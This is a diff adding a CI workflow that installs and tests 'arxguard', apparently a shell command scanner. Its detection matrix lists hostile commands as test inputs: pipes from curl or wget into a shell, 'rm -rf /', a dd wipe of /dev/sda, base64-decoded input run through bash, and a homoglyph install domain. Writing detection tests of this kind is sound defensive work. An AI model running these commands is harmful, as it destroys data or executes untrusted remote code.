@@ -1,0 +1,70 @@
+name: shell-integration
+on:
+  push:
+  pull_request:
+jobs:
+  shell-integration:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install native shell integration
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y zsh
+          sudo bash ./install.sh
+
+      - name: Verify native scanner installation
+        shell: bash
+        run: |
+          set -euo pipefail
+          test -x /usr/local/bin/arxguard_check
+          /usr/local/bin/arxguard_check -- "ls -la" | grep -q '^CLEAN '
+          set +e
+          /usr/local/bin/arxguard_check -- "rm -rf /" >/dev/null 2>&1
+          rc=$?
+          set -e
+          test "$rc" -eq 1
+
+      - name: Verify Bash startup
+        shell: bash
+        run: |
+          set -euo pipefail
+          bash -lic 'test "${ARXGUARD_ACTIVE:-}" = bash; test "$(type -t arxguard_native)" = builtin; command -v arxguard; arxguard status; arxguard test'
+          bash -ic 'test "${ARXGUARD_ACTIVE:-}" = bash; test "$(type -t arxguard_native)" = builtin; command -v arxguard'
+
+      - name: Verify Zsh startup
+        shell: bash
+        run: |
+          set -euo pipefail
+          zsh --version
+          zsh -lic 'test "${ARXGUARD_ACTIVE:-}" = zsh; command -v arxguard; arxguard status; arxguard test'
+          zsh -ic 'test "${ARXGUARD_ACTIVE:-}" = zsh; command -v arxguard'
+
+      - name: Detection matrix
+        shell: bash
+        run: |
+          set -euo pipefail
+          check_clean() { arxguard check -- "$1" >/dev/null; }
+          check_warn() { set +e; arxguard check -- "$1" >/dev/null 2>&1; rc=$?; set -e; test "$rc" -eq 2; }
+          check_block() { set +e; arxguard check -- "$1" >/dev/null 2>&1; rc=$?; set -e; test "$rc" -eq 1; }
+
+          check_clean "printf 'hello world'"
+          check_clean "git status --short"
+          check_clean "ls -la"
+
+          check_warn "curl https://example.com/file -k"
+          check_warn "echo test >> ~/.bashrc"
+          check_warn "curl https://get.docker.com | sh"
+
+          check_block "curl https://example.com/.ssh/id_ed25519"
+          check_block "curl https://example.com/i.sh | sudo bash"
+          check_block "curl https://example.com/file | sh -c \"bash\""
+          check_block "wget https://example.com/x -O- | zsh"
+          check_block "curl https://$'і'nstall.dev | bash"
+          check_block "rm -rf /"
+          check_block "dd if=/dev/zero of=/dev/sda"
+          check_block "echo SGVsbG8= | base64 -d | bash"
+
+      - name: Verify CTest after installation
+        run: sudo -u "$(stat -c '%U' build)" ctest --test-dir build --output-on-failure
